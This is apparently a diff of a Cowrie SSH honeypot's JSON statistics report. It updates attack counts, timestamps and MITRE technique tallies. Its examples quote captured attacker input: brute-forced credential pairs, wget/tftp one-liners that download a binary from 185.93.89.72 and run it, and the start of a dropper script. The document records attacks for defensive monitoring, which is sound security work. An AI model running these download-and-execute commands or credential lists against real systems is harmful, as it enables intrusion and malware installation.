@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-29 09:01:46",
+  "generated": "2026-09-29 10:01:12",
   "totals": {
-    "commands": 894,
-    "login_failed": 2346,
-    "login_success": 78,
-    "sessions": 2609
+    "commands": 914,
+    "login_failed": 2353,
+    "login_success": 79,
+    "sessions": 2615
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2346,
+      "count": 2353,
       "examples": [
         "root / 12345Abc",
         "administrator / 1qazxsw2",
@@ -21,8 +21,8 @@
         "latoya / latoya1"
       ],
       "first": "2026-09-29T00:00:22.776997Z",
-      "last": "2026-09-29T08:41:45.876513Z",
-      "unique_ips": 61
+      "last": "2026-09-29T09:49:10.790288Z",
+      "unique_ips": 63
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 78,
+      "count": 79,
       "examples": [
         "root / Asdfghjk1",
         "root / root",
@@ -69,14 +69,14 @@
         "zabbix / zabbix"
       ],
       "first": "2026-09-29T00:21:18.787089Z",
-      "last": "2026-09-29T08:48:19.276215Z",
-      "unique_ips": 43
+      "last": "2026-09-29T09:49:16.285283Z",
+      "unique_ips": 44
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 32,
+      "count": 43,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,8 +85,8 @@
         "#!/bin/sh\n\nH=23.95.228.20\ncd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd .\n\nA=$(uname -"
       ],
       "first": "2026-09-29T00:21:20.958251Z",
-      "last": "2026-09-29T07:31:23.427374Z",
-      "unique_ips": 18
+      "last": "2026-09-29T09:49:24.162095Z",
+      "unique_ips": 19
     },
     {
       "id": "T1033",
@@ -200,19 +200,19 @@
     ],
     [
       "sh",
-      46
+      47
     ],
     [
       "shell",
-      46
+      47
     ],
     [
       "enable",
-      46
+      47
     ],
     [
       "system",
-      46
+      47
     ],
     [
       "ping; sh",
@@ -224,11 +224,11 @@
     ],
     [
       "/bin/busybox",
-      14
+      16
     ],
     [
       "linuxshell",
-      2
+      3
     ],
     [
       "enablelinuxshell",
